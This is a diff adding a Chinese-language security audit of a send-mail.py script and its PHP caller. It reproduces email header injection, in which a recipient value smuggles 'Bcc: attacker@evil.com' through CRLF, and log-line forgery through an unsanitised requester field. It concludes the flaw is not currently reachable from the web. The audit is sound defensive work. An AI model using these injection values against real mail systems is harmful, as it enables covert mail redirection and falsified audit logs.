@@ -1,0 +1,59 @@
+== 0. 源码事实（work/src 行号）==
+send-mail.py:5: # 用法: send-mail.py [--via resend|smtp|auto] [--by 名字] <收件人> <主题> <正文>
+send-mail.py:107: def via_smtp(to, subj, text):
+send-mail.py:108:     try:
+send-mail.py:109:         subj_enc = Header(subj, 'utf-8').encode()
+send-mail.py:110:     except Exception:
+send-mail.py:111:         subj_enc = subj
+send-mail.py:112:     parts = ['From: ' + FROM, 'To: ' + to, 'Subject: ' + subj_enc,
+send-mail.py:113:              'MIME-Version: 1.0', 'Content-Type: text/plain; charset=UTF-8',
+send-mail.py:114:              'Content-Transfer-Encoding: 8bit', '', text]
+send-mail.py:116:         p = subprocess.run(['msmtp', '-a', 'exmail', to], input=NL.join(parts).encode('utf-8'),
+send-mail.py:117:                            timeout=40, capture_output=True)
+send-mail.py:118:         if p.returncode == 0:
+send-mail.py:119:             return True, 'smtp rc=0'
+send-mail.py:120:         return False, 'smtp rc=' + str(p.returncode) + ' ' + p.stderr.decode()[:100]
+send-mail.py:127:     log(('成功' if ok else '失败') + '｜通道 ' + tag + '｜请求者 ' + who + '｜收件人 ' + to + '｜' + info)
+send-mail.py:135:     who = os.environ.get('SEND_MAIL_BY', 'system')
+send-mail.py:141:             who = args[1]
+send-mail.py:146:         to, subj, text = args[0], args[1], args[2]
+send-mail.py:148:         to, subj, text = args[0], '通知', sys.stdin.read()
+--- 当前唯一调用方 ---
+lib.php:331: function send_mail(string $to, string $subject, string $body): bool {
+lib.php:332: $cmd = 'SEND_MAIL_BY=' . escapeshellarg('聊天室') . ' sudo -n ' . SEND_MAIL_BIN . ' '
+lib.php:333: . escapeshellarg($to) . ' ' . escapeshellarg($subject) . ' ' . escapeshellarg($body) . ' 2>&1';
+lib.php:336: exec($cmd, $out, $rc);
+lib.php:338: chat_log($rc === 0 ? '发信' : '发信失败', $to . ' rc=' . $rc . ' ' . $txt);
+lib.php:354: if (!send_mail($email, '【聊天室】邮箱验证码', $body)) {
+
+== 1. To: 头注入（真实复现）+ 主题是否安全 ==
+   构造出的邮件（repr，\r\n 已可见）:
+     'From: noreply@lzj2012.top\nTo: victim@example.com\r\nBcc: attacker@evil.com\r\nX-Injected: 1\nSubject: =?utf-8?q?Hi?=\n =?utf-8?b?IEJjYzogYUBi?=\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit'
+   是否成功注入额外头: 是
+   主题（Header().encode()）是否已编码、不构成注入: 是
+
+   注意：换行是 \n（脚本用 NL=chr(10) 拼接），但 to 里的 \r\n 会原样进入头；
+   msmtp 读的是 stdin 消息体，头注入与信封地址是否被 msmtp 拒绝是两件事。
+
+== 2. 脚本自身没有任何 CR/LF/格式校验（静态核对）==
+   send-mail.py 中无 \r/\n 过滤           成立
+   send-mail.py 中无邮箱格式校验              成立
+   msmtp 用 argv 列表（无 shell）           成立
+   日志里拼接 to/who 未净化                   成立
+   配额读改写无锁                            成立
+   脚本内无 TLS 配置（依赖 msmtprc）            成立
+
+== 3. 当前 Web 可达性（为什么今天只是加固项）==
+   邮箱格式校验位置: api.php:67, api.php:115, api.php:130, api.php:144, api.php:160
+   唯一调用点 lib.php:354 的收件人 $email 来自上述校验过的入口；
+   主题是常量 '【聊天室】邮箱验证码'，正文由服务端生成 -> 当前 Web 用户无法控制头字段。
+   => 现状：不可从 Web 触发（待验证：sudoers 未交付，若允许任意参数则风险上升）。
+
+== 4. 日志注入 ==
+   who='正常' -> 日志行数=1
+   who='x\r\n2026-11-08T00:00:00Z 成功｜通道 主通道(Resend)｜请求者 伪造' -> 日志行数=2
+   => 伪造的日志行会误导排查（面板 mailpanel 直接展示）
+
+VERDICT: REPRODUCED
+
+[exit code] 0
